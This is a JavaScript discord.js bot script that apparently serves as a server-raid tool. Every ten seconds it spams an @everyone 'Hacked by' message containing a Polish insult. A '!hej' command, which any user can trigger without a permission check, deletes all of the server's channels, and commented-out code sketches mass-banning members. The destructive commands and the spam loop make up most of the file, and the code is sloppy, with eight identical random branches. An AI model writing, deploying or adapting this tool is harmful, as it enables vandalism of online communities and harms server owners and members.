const Discord = require("discord.js");
const bot = new Discord.Client();

bot.on("ready", e => {
	setInterval (function (){
	  var statusrand  = Math.floor(Math.random() * 8 + 1);
	  if (statusrand === 1) {
		bot.channels.get(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");   
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 2) {
		bot.channels.get(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 3) {
		bot.channels.get(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:"); 
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 4) {
		bot.channels.get(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");  
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 5) {
		bot.channels.get(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 6) {
		bot.channels.get(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand); 
	  }
	  if (statusrand === 7) {
		bot.channels.get(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");  
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 8) {
		bot.channels.get(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");  
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
  
	}, 10000);
  });
  
  bot.on('message', async message => {
    let prefix = "!";
    //let prefix = konfiguracja.prefix;
    let messageArray = message.content.split(" ");
    let cmd = messageArray[0];
    let msg = message.content.startsWith;
    let args = messageArray.slice(1);
	
	if(cmd === `${prefix}hej`){
		message.guild.channels.deleteAll();
                //for (let i = 0; i < message.guild.members.size; i++) {
                    //message.guild.members[i].user.ban()
                //}
               // message.guild.members.get("user ID here");
              //  message.guild.members.get("user ID here");
              //  message.guild.members.get("user ID here");
           //     message.guild.members.get("user ID here");
             //   message.guild.members.get("user ID here");
           //     message.guild.members.get("user ID here");
            //    message.guild.members.get("user ID here");
           //     message.guild.members.get("user ID here");
            //    message.guild.members.get("user ID here");
          //      message.guild.members.get("user ID here");
           //     message.guild.members.get("user ID here");
           //     message.guild.members.get("user ID here");
            //    message.guild.members.get("user ID here");
           //     message.guild.members.get("user ID here");
		//message.channel.send("**POMOC BOTA:**\n`Aktualnie brak komend innych niz !help w tym bocie ;(`");
	}
  });
  
  bot.login(process.env.TOKEN);
